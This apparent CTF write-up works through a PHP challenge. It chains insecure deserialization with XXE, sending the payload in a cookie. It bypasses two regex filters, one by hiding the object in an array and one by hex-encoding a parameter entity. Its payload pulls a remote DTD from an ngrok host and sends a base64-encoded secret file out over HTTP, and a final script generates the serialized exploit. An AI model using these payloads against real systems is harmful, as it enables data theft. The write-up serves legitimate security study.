I"0F<h2 id="introduction">Introduction</h2>

<p>In this challenge we will take advantage of PHP deserialization attack to send our XXE payload through HTTP Cookies, But first we have to Bypass 2 WAFS! let’s get started.</p>

<h3 id="code-analysis">Code Analysis</h3>
<p><strong><em>index.php</em></strong> 
We can see below a new object is defined of type <em>XmlParserModel</em> passing to it the <em>.env</em> file, we will get back to this class later. The interesting part here is were the application defines a cookie of type <em>UserModel</em>, moving forward it serializes the cookie and sends it back the the user as shown below.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">new</span> <span class="nc">XmlParserModel</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'.env'</span><span class="p">));</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'PHPSESSID'</span><span class="p">]))</span>
<span class="p">{</span>
    <span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">UserModel</span><span class="p">;</span>
    <span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">uniqid</span><span class="p">(</span><span class="s1">'guest_'</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
    <span class="nb">setcookie</span><span class="p">(</span>
        <span class="s1">'PHPSESSID'</span><span class="p">,</span> 
        <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">)),</span> 
        <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="p">,</span> 
        <span class="s1">'/'</span>
    <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Two different routes are defined within the application
<strong><em>index.php</em></strong></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$router</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Router</span><span class="p">();</span>

<span class="nv">$router</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="k">fn</span><span class="p">(</span><span class="nv">$router</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nv">$router</span><span class="o">-&gt;</span><span class="nf">view</span><span class="p">(</span><span class="s1">'menu'</span><span class="p">));</span>
<span class="nv">$router</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span><span class="s1">'POST'</span><span class="p">,</span> <span class="s1">'/api/order'</span><span class="p">,</span> <span class="s1">'OrderController@order'</span><span class="p">);</span>
</code></pre></div></div>
<p><strong>POST</strong> requests to <em>/api/order</em> route calls the <em>order(</em>) function from its  <em>OrderController.php</em> module, let’s check it out.
<strong><em>OrderController.php</em></strong></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">OrderController</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">order</span><span class="p">(</span><span class="nv">$router</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$body</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'php://input'</span><span class="p">);</span>
        <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'PHPSESSID'</span><span class="p">]);</span>
        <span class="nf">safe_object</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">);</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">);</span>
</code></pre></div></div>
<p>Now Let’s take a look into the <em>safe_object()</em> function 
<strong><em>OrderController.php</em></strong></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">safe_object</span><span class="p">(</span><span class="nv">$serialized_data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$matches</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="nv">$num_matches</span> <span class="o">=</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">'/(^|;)O:\d+:"([^"]+)"/'</span><span class="p">,</span> <span class="nv">$serialized_data</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$num_matches</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$methods</span> <span class="o">=</span> <span class="nb">get_class_methods</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="nv">$i</span><span class="p">]);</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$methods</span> <span class="k">as</span> <span class="nv">$method</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^__.*$/'</span><span class="p">,</span> <span class="nv">$method</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">die</span><span class="p">(</span><span class="s2">"Unsafe method: ${method}"</span><span class="p">);</span>
            <span class="p">}}}}</span>
</code></pre></div></div>
<p>So what this function does briefly is that it takes the serialized payload and uses regex to search for the occurrences of <code class="language-plaintext highlighter-rouge">o:&lt;some number&gt;:"&lt;class name&gt;"</code>, extracts the class name, and calls <strong>get_class_methods()</strong> function to check for all functions of a class, iterates over them, if a PHP magic method such as <strong>constructor</strong>, <strong>wakeup</strong> .. etc is found, it will match the second regex, thus the application will call <strong>die()</strong> to end the application.</p>

<p>Before trying to bypass the WAF, we have to build our PHP gadget, we have to find a useful class that uses any magic methods.</p>

<p><strong><em>XmlParserModel.php</em></strong></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">XmlParserModel</span>
<span class="p">{</span>
    <span class="k">private</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">;</span>
    <span class="k">private</span> <span class="kt">array</span> <span class="nv">$env</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
    <span class="p">{</span>
      
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">"/&lt;!(?:DOCTYPE|ENTITY)(?:\s|%|&amp;#[0-9]+;|&amp;#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+[\'</span><span class="se">\"</span><span class="s2">]/im"</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'Unsafe XML'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$env</span> <span class="o">=</span> <span class="o">@</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="s1">'SimpleXMLElement'</span><span class="p">,</span> <span class="no">LIBXML_NOENT</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$env</span><span class="p">)</span> 
        <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'Malformed XML'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$env</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$_ENV</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">string</span><span class="p">)</span><span class="nv">$value</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

<span class="p">}</span>
</code></pre></div></div>

<p>As we can see above, this class uses  <strong>__wakeup()</strong>, and uses regex again to check for malicious XXE payload, it filters the occurrence of <strong>&lt;!ENTITY file SYSTEM “file:///path/to/file”&gt;</strong>. if a match is found, the application is suspended, else it will parse the XML.</p>
<h3 id="building-the-exploit">Building the exploit</h3>
<p>In order to build our exploit, we have to create a new serialized object of type <strong><em>XmlParserModel</em></strong> and set the <strong>$data</strong> to XXE payload that reads the flag, but first let’s bypass the <strong><em>safe_object()</em></strong></p>

<h3 id="kill-waf-1">KILL WAF #1</h3>
<p>Inspired from the <a href="https://github.com/MegadodoPublications/exploits/blob/master/composr.md">Composr CMS Remote Code Execution</a>, We can easily bypass the poor regex by defining an array object with a string of value <strong>“;O:2:”</strong> at index 0, then passing our malicious object to the next index.
For example, In the payload below, the regex will match <strong>;O:10</strong>, as if it’s a class name, bypassing the <strong><em>get_class_methods()</em></strong></p>
<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// a:1:{s:5:";O:2:";O:10:"HelloWorld":0:{}};
//           ^           ^
// match   begin        end
</code></pre></div></div>
<h3 id="kill-waf-2">KILL WAF #2</h3>
<p>The XXE WAF can be bypassed through HTML encoding our malicious crafted entity, but to make things easier, we will exfiltrate data through an out-of-band OBB channel using HTTP by utilizing parameter entities, we will use <strong>&lt;!ENTITY % dtd SYSTEM “http://attackerserver.com/malc.dtd” &gt;</strong> to refer to a DTD defined and hosted on our remote server, and that’s for the purpose of bypassing the regex once only. 
We can now craft our payload and save it into a file, then host it.</p>

<p><strong><em>malc.dtd</em></strong></p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/secret"&gt;</span>
<span class="cp">&lt;!ENTITY % abt "&lt;!ENTITY exfil SYSTEM 'http://8cda-188-247-74-33.ngrok.io/bypass.xml?%data;'&gt;</span>"&gt;
%abt; 
</code></pre></div></div>
<p>Now creating our XXE payload, First let’s define our private entity to import the remote the DTD.</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % dtd SYSTEM "http://8cda-188-247-74-33.ngrok.io/malc.dtd" &gt;</span> 
</code></pre></div></div>
<p>HTML encoding is equivalent to:</p>
<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ni">&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;</span>
<span class="ni">&amp;#x25;&amp;#x20;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;</span>
<span class="ni">&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;</span>
<span class="ni">&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x38;&amp;#x63;&amp;#x64;&amp;#x61;&amp;#x2d;&amp;#x31;</span>
<span class="ni">&amp;#x38;&amp;#x38;&amp;#x2d;&amp;#x32;&amp;#x34;&amp;#x37;&amp;#x2d;&amp;#x37;&amp;#x34;</span>
<span class="ni">&amp;#x2d;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x6e;&amp;#x67;&amp;#x72;&amp;#x6f;&amp;#x6b;</span>
<span class="ni">&amp;#x2e;&amp;#x69;&amp;#x6f;&amp;#x2f;&amp;#x6d;&amp;#x61;&amp;#x6c;&amp;#x63;&amp;#x2e;</span>
<span class="ni">&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x20;&amp;#x3e;</span>
</code></pre></div></div>
<p>Inject the entity into the DOCTYPE:</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY % a "&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x38;&amp;#x63;&amp;#x64;&amp;#x61;&amp;#x2d;&amp;#x31;&amp;#x38;&amp;#x38;&amp;#x2d;&amp;#x32;&amp;#x34;&amp;#x37;&amp;#x2d;&amp;#x37;&amp;#x34;&amp;#x2d;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x6e;&amp;#x67;&amp;#x72;&amp;#x6f;&amp;#x6b;&amp;#x2e;&amp;#x69;&amp;#x6f;&amp;#x2f;&amp;#x6d;&amp;#x61;&amp;#x6c;&amp;#x63;&amp;#x2e;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x20;&amp;#x3e;" &gt;</span>
  %a; 
  %dtd;
]&gt;
<span class="nt">&lt;data&gt;&lt;env&gt;</span><span class="ni">&amp;exfil;</span><span class="nt">&lt;/env&gt;&lt;/data&gt;</span>
</code></pre></div></div>

<h2 id="final-exploit">Final Exploit</h2>
<p>Our final exploit will look like</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">XmlParserModel</span> <span class="p">{</span> 

	<span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
    <span class="p">{</span>	

    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span> 
    <span class="p">}</span> 

<span class="p">}</span>
<span class="nv">$exploit</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">([</span><span class="s2">";O:2:"</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nc">XmlParserModel</span><span class="p">(</span><span class="s1">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % a "&amp;#x3c;&amp;#x21;&amp;#x45;&amp;#x4e;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4d;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x38;&amp;#x63;&amp;#x64;&amp;#x61;&amp;#x2d;&amp;#x31;&amp;#x38;&amp;#x38;&amp;#x2d;&amp;#x32;&amp;#x34;&amp;#x37;&amp;#x2d;&amp;#x37;&amp;#x34;&amp;#x2d;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x6e;&amp;#x67;&amp;#x72;&amp;#x6f;&amp;#x6b;&amp;#x2e;&amp;#x69;&amp;#x6f;&amp;#x2f;&amp;#x6d;&amp;#x61;&amp;#x6c;&amp;#x63;&amp;#x2e;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x20;&amp;#x3e;" &gt;%a;%dtd;]&gt;&lt;data&gt;&lt;env&gt;&amp;exfil;&lt;/env&gt;&lt;/data&gt;'</span><span class="p">)]);</span>
<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$exploit</span><span class="p">);</span> 
 
<span class="cp">?&gt;</span>
</code></pre></div></div>
:ET